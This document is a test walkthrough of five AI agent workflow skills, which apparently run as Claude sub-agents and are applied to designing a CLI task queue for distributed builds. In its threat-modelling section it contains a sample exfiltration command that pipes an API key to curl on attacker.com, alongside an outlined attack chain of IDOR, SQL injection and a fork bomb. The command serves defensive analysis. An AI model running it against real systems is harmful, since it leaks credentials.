# Skill Test Walkthrough

This walkthrough documents end-to-end testing of 5 workflow skills against a common scenario: **designing a CLI task queue for distributed builds**. Each skill was tested by an independent agent, running in parallel, to verify the skill works as documented.

## Test Summary

| Skill          | Verdict | What Was Tested                                | Issues Found                                           |
| -------------- | ------- | ---------------------------------------------- | ------------------------------------------------------ |
| `/brainstorm`  | PASS    | Python CLI backend (init, add, rate, report)   | `.venv` path mismatch; missing `sentence-transformers` |
| `/diverge`     | PARTIAL | 3-lens multi-agent research + synthesis        | Sub-agents can't spawn their own agents                |
| `/premortem`   | PASS    | 3 failure narratives + risk registry synthesis | Minor markdown table formatting                        |
| `/stress-test` | PASS    | 3 attack vectors + vulnerability map synthesis | Sub-agents used `claude -p` workaround                 |
| `/distill`     | PARTIAL | 4-stage compression chain on BEST_PRACTICES.md | Stage 1 over-compressed code-heavy content             |

---

## 1. Brainstorm

### What It Does

The brainstorm skill runs a structured ideation session with a Python backend that enforces shape uniqueness -- every new idea must be structurally distinct from prior art and all previous ideas.

### Test Run

```
/brainstorm 5 How to design a CLI task queue for distributed builds
```

### Commands Tested

| Command                                                  | Purpose                                  | Result                                  |
| -------------------------------------------------------- | ---------------------------------------- | --------------------------------------- |
| `brainstorm.py init "..." --count 5`                     | Create session                           | Created session `523db1639c36`          |
| `brainstorm.py prior-art <id> "Celery-style task queue"` | Log exclusion zone                       | Recorded 1 prior art entry              |
| `brainstorm.py begin <id>`                               | Transition to divergence                 | Confirmed research phase complete       |
| `brainstorm.py add <id> "title" "desc"` (x5)             | Add ideas through uniqueness gate        | All 5 accepted, progress bar updated    |
| `brainstorm.py status <id>`                              | Check progress                           | Showed session metadata and idea table  |
| `brainstorm.py rate <id> <num> F N I` (x3)               | Rate ideas on Feasibility/Novelty/Impact | Scores recorded and displayed           |
| `brainstorm.py report <id>`                              | Generate convergence report              | Full markdown report with ranked tables |

### Sample Output (Report)

```
# Brainstorm Report

Session: 523db1639c36
Problem: How to design a CLI task queue for distributed builds
Ideas: 5 generated, 3 rated

## Top Ideas (by total score)

| Rank | # | Title                                   | F | N | I | Total  |
|------|---|-----------------------------------------|---|---|---|--------|
| 1    | 3 | Content-addressed build cache with steal | 4 | 4 | 5 | 13/15  |
| 2    | 2 | Filesystem watch auction                 | 5 | 4 | 3 | 12/15  |
| 3    | 1 | Git-based DAG scheduler                  | 4 | 3 | 4 | 11/15  |
```

### Issues Found

1. **Missing `.venv` directory**: SKILL.md references `${CLAUDE_SKILL_DIR}/scripts/.venv/bin/python3` but no venv exists. Using system `python3` works fine as a fallback.
2. **Semantic similarity disabled**: Without `sentence-transformers` installed, the uniqueness gate falls back to text-only matching. Structurally similar ideas with different wording could slip through.
3. **No `finalize` command**: The actual command is `report` (the skill doc is consistent; the name just isn't intuitive).

### Verdict: PASS

All core commands work. The session lifecycle (research, divergence, convergence) executes as documented. The `.venv` path mismatch and missing `sentence-transformers` are setup issues, not design flaws.

---

## 2. Diverge

### What It Does

Spawns N independent research agents, each exploring a topic from a different lens (prior art, first-principles design, failure modes, etc.), then synthesizes findings into a unified analysis.

### Test Run

```
/diverge 3 "How should a CLI task queue for distributed builds handle job prioritization and failure recovery?"
```

### Research Lenses

| #   | Lens                              | Key Findings                                                                                                                                             |
| --- | --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Prior art & industry patterns     | Bazel/BuildBuddy late-binding scheduling; Meta's FOQS billion-item queue; Celery's 4-tier priority model; Temporal's durable execution                   |
| 2   | First-principles technical design | Multi-tier queue architecture; idempotency as non-negotiable; checkpoint-based recovery; exponential backoff + jitter; dead letter queues as first-class |
| 3   | Failure modes & risks             | Poison pill tasks blocking the queue; priority starvation; thundering herd on recovery; split-brain duplicate execution; worker resource exhaustion      |

### Synthesis Highlights

**Convergence points** (all 3 agents agreed):

- Idempotency is foundational -- every retry/recovery mechanism depends on it
- 3-4 priority tiers beat fine-grained numeric priority (industry consensus)
- Dead letter queues must be first-class, not afterthoughts
- Exponential backoff with jitter is the consensus retry strategy

**Key tension**: Late-binding scheduling (from Bazel/Sparrow, optimized for throughput) vs. checkpoint-based durable execution (from Temporal, optimized for reliability). Resolution depends on task granularity -- late-binding for short compilations, durable execution for long test suites.

**Most surprising finding**: Meta needed to add randomization to an already-prioritized dequeue path to prevent starvation.

### Issues Found

1. **Sub-agents can't spawn their own agents**: The skill requires the Agent tool to launch parallel research agents, but agents spawned by the test harness don't have access to the Agent tool. The test agent simulated the research lenses within a single context.
2. **Phase 1 confirmation step**: The skill blocks for user confirmation, which would need auto-confirmation in automated pipelines.

### Verdict: PARTIAL

The skill design is sound and the synthesis framework (convergence, divergence, unique insights) is effective. Marked partial because the core mechanism -- truly independent parallel agents with uncorrelated context windows -- could not be tested from within a sub-agent.

---

## 3. Premortem

### What It Does

Spawns N independent failure agents, each writing a narrative from the future where the project failed for a different root cause. Synthesizes into a risk registry with severity ratings and mitigations.

### Test Run

```
/premortem 3 "CLI task queue: Go CLI, SQLite storage, polling workers on Linux/macOS, job dependencies, 5-20 developer teams"
```

### Failure Narratives

| #   | Lens                     | Key Risks                                                                                              |
| --- | ------------------------ | ------------------------------------------------------------------------------------------------------ |
| 1   | Technical Architecture   | SQLite write contention, O(n\*m) dependency scan, WAL growth, NFS corruption, polling amplification    |
| 2   | Integration & Dependency | CGO cross-compilation breakage, SQLite version skew, YAML library CVE, OS-specific process management  |
| 3   | Operational              | No monitoring, no backups, no cycle detection, disk exhaustion, WAL corruption, single point of access |

### Risk Registry (Top 5)

| Risk                                                          | Severity | Mitigation                                              |
| ------------------------------------------------------------- | -------- | ------------------------------------------------------- |
| SQLite write contention causes SQLITE_BUSY cascades           | CRITICAL | Single coordinator process or migrate to PostgreSQL     |
| No monitoring/alerting/backups -- silent failure accumulation | CRITICAL | Health endpoints, structured logging, automated backups |
| Cyclic dependency submission causes infinite loop             | CRITICAL | Topological sort validation at submission time          |
| CGO dependency breaks cross-platform builds                   | HIGH     | Use pure-Go SQLite (modernc.org/sqlite)                 |
| OS-specific process management leaves orphan processes        | HIGH     | Platform interface with build tags; CI matrix testing   |

### Cross-Cutting Theme

All three independent lenses converged on SQLite as the fundamental vulnerability -- the technical lens found write contention, the integration lens found version skew and CGO pain, the operational lens found WAL corruption and missing backup tooling. This convergence across isolated perspectives is the strongest signal: **SQLite is the wrong tool for this job at non-trivial scale**.

### Issues Found

1. **Markdown table formatting**: Line 107 of SKILL.md uses em-dashes instead of hyphens in the table separator row, which renders incorrectly in most parsers.
2. **Phase 4 is interactive**: The skill ends with follow-up questions, which is good for interactive use but means it has no clean "done" state for automated pipelines.

### Verdict: PASS

The failure lens categories are well-chosen and produced genuinely distinct narratives with meaningful convergence on underlying vulnerabilities. The synthesis phase transforms raw narratives into actionable guidance.

---

## 4. Stress-Test

### What It Does

Spawns N independent attack agents, each trying to BREAK a system from a different angle. Synthesizes into a vulnerability map with severity ratings.

### Test Run

```
/stress-test 3 "CLI task queue: Go CLI, SQLite DB, polling workers, job dependencies, REST API, API key auth"
```

### Attack Results

| #   | Vector                        | Vulns Found | Top Finding                                           |
| --- | ----------------------------- | ----------- | ----------------------------------------------------- |
| 1   | Edge Cases & Input Boundaries | 12          | Command injection via job definitions                 |
| 2   | Scale & Resource Exhaustion   | 10          | Unbounded queue growth with no backpressure           |
| 3   | Security & Access Control     | 12          | API key leaked to child processes via env inheritance |

### Vulnerability Map (Top 5)

| Vulnerability                           | Severity | Vectors | Mitigation                                                    |
| --------------------------------------- | -------- | ------- | ------------------------------------------------------------- |
| Command injection via job definitions   | CRITICAL | 1, 3    | `exec.Command(binary, args...)` not `sh -c`; sandbox workers  |
| SQL injection via string concatenation  | CRITICAL | 1, 3    | Parameterized queries; `sqlvet` lint rule in CI               |
| API key leaked to child processes       | CRITICAL | 3       | Strip env vars before exec; file-based secrets                |
| SQLite write lock contention/corruption | CRITICAL | 1, 2, 3 | WAL mode; atomic claims; migrate to PostgreSQL for multi-host |
| No worker sandboxing                    | CRITICAL | 2       | cgroups v2 with CPU/memory/PID limits; per-job timeouts       |

### Worst-Case Attack Chain

1. Submit malicious job with `env | grep API_KEY | curl attacker.com`
2. Worker executes without sandboxing, exfiltrates the key
3. Attacker authenticates to REST API with stolen key
4. Enumerate all jobs via sequential ID IDOR
5. Inject SQL via REST API filter params
6. Submit fork bomb, crash worker, corrupt SQLite mid-write

**Every major component** was flagged by all 3 independent agents -- a signal of systemic gaps rather than isolated issues.

### Issues Found

1. **Agent tool workaround**: The test agent used `claude -p` via Bash to simulate parallel attack agents, which worked but isn't the prescribed mechanism.
2. **Synthesis is the real value**: Raw output was 34 findings; the deduplicated vulnerability map, heat map, and attack chain are where the skill earns its keep.

### Verdict: PASS

The adversarial analysis + synthesis workflow produces high-value output. Independent agents converging on the same vulnerabilities provides high-confidence signal.

---

## 5. Distill

### What It Does

Runs a chain of 4 sequential compression agents, each compressing the previous output by ~50%. The key insight: what gets DROPPED at each layer reveals the priority hierarchy.

### Test Run

```
/distill BEST_PRACTICES.md
```

### Compression Chain

| Stage    | Input Words | Output Words | Ratio | Key Drops                                                                     |
| -------- | ----------- | ------------ | ----- | ----------------------------------------------------------------------------- |
| Original | 2296        | --           | --    | --                                                                            |
| Stage 1  | 2296        | 680          | 29.6% | JSON/YAML config blocks, bash examples, code-simplifier agent definition      |
| Stage 2  | 680         | 335          | 49.3% | Simplifier agent detail, pipeline launch syntax, Post-Implementation chain    |
| Stage 3  | 335         | 180          | 53.7% | Section headers collapsed, Architecture/Bug chains, notification hook details |
| Stage 4  | 180         | 89           | 49.4% | Hooks ecosystem enumeration, parallel sessions, permissions detail            |

**Overall**: 2296 words compressed to 89 words (3.9% of original).

### Priority Hierarchy (from drops)

| Tier       | Survived     | Content                                                                                                    |
| ---------- | ------------ | ---------------------------------------------------------------------------------------------------------- |
| Core       | All 4 rounds | Plan first, verify everything, scope agents to changed files, model tiering, simplify after every workflow |
| Important  | 3 rounds     | `context:fork` for isolation, routing rules in CLAUDE.md, workflow chains (High Risk / Low Risk)           |
| Supporting | 2 rounds     | Front-load context, WorktreeCreate hook, safe permissions, notification hooks                              |
| Context    | 1 round      | Background verification pattern, pipeline YAML syntax, custom agent definitions                            |
| Noise      | Round 1      | JSON config examples, bash command strings, platform-specific notification splits                          |

### Issues Found

1. **Stage 1 over-compressed (29.6% vs ~50% target)**: Code-heavy artifacts lose disproportionate word count when examples are stripped. The skill should note that code blocks compress non-linearly.
2. **No guidance on code block handling**: Should code examples be summarized, kept verbatim, or dropped? This ambiguity caused the aggressive first-stage compression.

### Verdict: PARTIAL PASS

The compression chain works and the priority hierarchy is genuinely useful -- it reveals what matters most in a document through what survives each cut. The partial is for the code-heavy artifact edge case, which is a documentation gap, not a design flaw.

---

## Cross-Cutting Observations

### What Works Well

- **Parallel agent pattern**: All multi-agent skills (diverge, premortem, stress-test) produce genuinely independent perspectives that converge on high-confidence signals.
- **Synthesis is the value multiplier**: Raw agent output is useful but overwhelming. The synthesis phase (risk registries, vulnerability maps, priority hierarchies) is where these skills differentiate from just "asking the same question multiple times."
- **Brainstorm's Python backend**: The CLI-based session management is robust and the uniqueness gate prevents repetitive ideation.

### Common Issues

1. **Agent-spawning skills can't be tested from within agents**: Skills that require the Agent tool (diverge, premortem, stress-test) can't spawn sub-sub-agents. Test agents used workarounds (simulation, `claude -p`).
2. **Interactive confirmation steps**: Every multi-agent skill blocks for user confirmation after framing. Good for interactive use, but needs a non-interactive mode for pipelines.
3. **Missing dependency handling**: Brainstorm needs `sentence-transformers`; the `.venv` path in SKILL.md doesn't exist. A setup/bootstrap step would help.

### Recommended Fixes

| Fix                                                               | Skills Affected                 | Effort |
| ----------------------------------------------------------------- | ------------------------------- | ------ |
| Add guidance for code-heavy artifacts in compression targets      | distill                         | Low    |
| Fix `.venv` path or add setup instructions                        | brainstorm                      | Low    |
| Fix em-dash table separators                                      | premortem                       | Low    |
| Document `claude -p` fallback for environments without Agent tool | diverge, premortem, stress-test | Low    |
| Add `--auto` flag docs for non-interactive pipeline use           | all multi-agent skills          | Medium |
